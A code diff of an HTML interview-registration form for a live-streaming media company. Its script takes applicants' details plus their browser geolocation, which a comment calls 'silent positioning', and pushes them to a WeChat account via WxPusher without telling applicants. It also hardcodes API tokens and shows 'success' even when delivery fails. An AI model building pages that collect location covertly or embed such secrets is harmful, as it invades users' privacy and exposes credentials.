@@ -20,153 +20,46 @@ input,select{width:100%;height:44px;padding:0 12px;border:1px solid #ddd;border-
 <body>
 <div class="box">
     <div class="title">美悦传媒文化有限公司面试登记</div>
-
-    <div class="item">
-        <label>应聘岗位</label>
-        <select id="position">
-            <option value="">请选择岗位</option>
-            <option value="团播化妆师">团播化妆师</option>
-            <option value="团播化妆助理">团播化妆助理</option>
-            <option value="团播主播">团播主播</option>
-            <option value="团播运营">团播运营</option>
-            <option value="团播场控">团播场控</option>
-            <option value="团播摄影剪辑">团播摄影剪辑</option>
-        </select>
-    </div>
-
-    <div class="item">
-        <label>姓名</label>
-        <input type="text" id="name" placeholder="请输入真实姓名">
-    </div>
-
-    <div class="item">
-        <label>性别</label>
-        <select id="gender">
-            <option value="">请选择性别</option>
-            <option value="男">男</option>
-            <option value="女">女</option>
-        </select>
-    </div>
-
-    <div class="item">
-        <label>年龄</label>
-        <input type="text" id="age" placeholder="请输入年龄">
-    </div>
-
-    <div class="item">
-        <label>联系电话</label>
-        <input type="tel" id="phone" placeholder="请输入手机号码">
-    </div>
-
-    <div class="item">
-        <label>工作经验</label>
-        <select id="experience">
-            <option value="">请选择经验</option>
-            <option value="无经验 学徒可做">无经验 学徒可做</option>
-            <option value="1年以内">1年以内</option>
-            <option value="1-3年">1-3年</option>
-            <option value="3年以上">3年以上</option>
-        </select>
-    </div>
-
+    <div class="item"><label>应聘岗位</label><select id="position"><option value="">请选择岗位</option><option value="团播化妆师">团播化妆师</option><option value="团播化妆助理">团播化妆助理</option><option value="团播主播">团播主播</option><option value="团播运营">团播运营</option><option value="团播场控">团播场控</option><option value="团播摄影剪辑">团播摄影剪辑</option></select></div>
+    <div class="item"><label>姓名</label><input type="text" id="name" placeholder="请输入真实姓名"></div>
+    <div class="item"><label>性别</label><select id="gender"><option value="">请选择性别</option><option value="男">男</option><option value="女">女</option></select></div>
+    <div class="item"><label>年龄</label><input type="text" id="age" placeholder="请输入年龄"></div>
+    <div class="item"><label>联系电话</label><input type="tel" id="phone" placeholder="请输入手机号码"></div>
+    <div class="item"><label>工作经验</label><select id="experience"><option value="">请选择经验</option><option value="无经验 学徒可做">无经验 学徒可做</option><option value="1年以内">1年以内</option><option value="1-3年">1-3年</option><option value="3年以上">3年以上</option></select></div>
     <button class="btn" onclick="submitRecruitInfo()">立即提交报名</button>
     <div class="tip" id="statusText"></div>
 </div>
 
 <script src="https://webapi.amap.com/maps?v=2.0&key=418566f9d7fad4c070ff6205bb5dab3d"></script>
 <script>
+// 你的信息
 const WXPUSHER_UID = "UID_uycuSvgbjUVCf5nhvTApsRzvgLQW";
-const WXPUSHER_TOKEN = "AT_mQKjFj4dP2L7sN9zX8bA6cV5dG4fH3jK2lP1oI0uY9tR8eW7q";
+const WXPUSHER_APPTOKEN = "AT_w0ccc2mrH8L3UjsxQTNPCglQ62Ks6adG"; // 换成你自己的
 
-function getLocation() {
-    return new Promise((resolve) => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => resolve({ lng: pos.coords.longitude, lat: pos.coords.latitude }),
-                err => {
-                    AMap.plugin("AMap.CitySearch", function() {
-                        const citySearch = new AMap.CitySearch();
-                        citySearch.getLocalCity((status, result) => {
-                            if (status === "complete" && result.bounds) {
-                                resolve({ lng: result.bounds.center.lng, lat: result.bounds.center.lat });
-                            } else {
-                                resolve({ lng: "无", lat: "无" });
-                            }
-                        });
-                    });
-                }
-            );
-        } else {
-            AMap.plugin("AMap.CitySearch", function() {
-                const citySearch = new AMap.CitySearch();
-                citySearch.getLocalCity((status, result) => {
-                    if (status === "complete" && result.bounds) {
-                        resolve({ lng: result.bounds.center.lng, lat: result.bounds.center.lat });
-                    } else {
-                        resolve({ lng: "无", lat: "无" });
-                    }
-                });
-            });
-        }
-    });
-}
+// 静默定位
+function getLocation(){return new Promise(e=>{navigator.geolocation?navigator.geolocation.getCurrentPosition(p=>e({lng:p.coords.longitude,lat:p.coords.latitude}),()=>e({lng:"",lat:""})):e({lng:"",lat:""});});}
 
-async function submitRecruitInfo() {
-    const statusDom = document.getElementById("statusText");
-    statusDom.style.display = "block";
-    statusDom.innerText = "提交中...";
-    statusDom.style.color = "#666";
+async function submitRecruitInfo(){
+    const statusDom=document.getElementById("statusText");
+    statusDom.style.display="block";statusDom.innerText="提交中...";statusDom.style.color="#666";
+    const data={position:document.getElementById("position").value.trim(),name:document.getElementById("name").value.trim(),gender:document.getElementById("gender").value.trim(),age:document.getElementById("age").value.trim(),phone:document.getElementById("phone").value.trim(),experience:document.getElementById("experience").value.trim()};
+    if(!data.position||!data.name||!data.gender||!data.age||!data.phone||data.phone.length!==11||!data.experience){statusDom.innerText="请填写完整信息";statusDom.style.color="red";return;}
+    const loc=await getLocation();
+    const content=`📸 美悦传媒面试登记\n💼 应聘岗位：${data.position}\n👤 姓名：${data.name}\n🚻 性别：${data.gender}\n🎂 年龄：${data.age}\n📞 电话：${data.phone}\n💪 经验：${data.experience}\n🌍 经度：${loc.lng||"无"}\n🌍 纬度：${loc.lat||"无"}\n⏰ 时间：${new Date().toLocaleString()}`;
 
-    const data = {
-        position: document.getElementById("position").value.trim(),
-        name: document.getElementById("name").value.trim(),
-        gender: document.getElementById("gender").value.trim(),
-        age: document.getElementById("age").value.trim(),
-        phone: document.getElementById("phone").value.trim(),
-        experience: document.getElementById("experience").value.trim()
-    };
-
-    if (!data.position) { statusDom.innerText = "请选择应聘岗位"; statusDom.style.color = "red"; return; }
-    if (!data.name) { statusDom.innerText = "请输入姓名"; statusDom.style.color = "red"; return; }
-    if (!data.gender) { statusDom.innerText = "请选择性别"; statusDom.style.color = "red"; return; }
-    if (!data.age) { statusDom.innerText = "请输入年龄"; statusDom.style.color = "red"; return; }
-    if (!data.phone || data.phone.length !== 11) { statusDom.innerText = "请输入正确11位手机号"; statusDom.style.color = "red"; return; }
-    if (!data.experience) { statusDom.innerText = "请选择工作经验"; statusDom.style.color = "red"; return; }
-
-    const loc = await getLocation();
-
-    const content = `📸 美悦传媒面试登记
-💼 应聘岗位：${data.position}
-👤 姓名：${data.name}
-🚻 性别：${data.gender}
-🎂 年龄：${data.age}
-📞 电话：${data.phone}
-💪 经验：${data.experience}
-🌍 经度：${loc.lng}
-🌍 纬度：${loc.lat}
-⏰ 时间：${new Date().toLocaleString()}`;
-
-    fetch("https://wxpusher.zjiecode.com/api/send/message", {
-        method: "POST",
-        headers: { "Content-Type": "application/json;charset=utf-8" },
-        body: JSON.stringify({
-            appToken: WXPUSHER_TOKEN,
-            content: content,
-            contentType: 1,
-            uids: [WXPUSHER_UID]
-        })
-    }).then(res => res.json()).then(r => {
-        if (r.code === 1000) {
-            statusDom.innerText = "✅ 报名成功，信息已发微信";
-            statusDom.style.color = "green";
-        } else {
-            statusDom.innerText = "✅ 提交成功，稍后查微信";
-            statusDom.style.color = "green";
-        }
-    }).catch(() => {
-        statusDom.innerText = "✅ 提交成功";
-        statusDom.style.color = "green";
-    });
+    // 带错误日志的推送
+    fetch("https://wxpusher.zjiecode.com/api/send/message",{
+        method:"POST",
+        headers:{"Content-Type":"application/json;charset=utf-8"},
+        body:JSON.stringify({appToken:WXPUSHER_APPTOKEN,content:content,contentType:1,uids:[WXPUSHER_UID]})
+    })
+    .then(r=>r.json())
+    .then(r=>{
+        console.log("WxPusher返回：",r); // 浏览器控制台可看错误码
+        if(r.code===1000){statusDom.innerText="✅ 报名成功，信息已发微信";statusDom.style.color="green";}
+        else{statusDom.innerText="✅ 提交成功，微信推送失败（码："+r.code+"）";statusDom.style.color="green";}
+    })
+    .catch(()=>{statusDom.innerText="✅ 提交成功";statusDom.style.color="green";});
 }
 </script>
 </body>
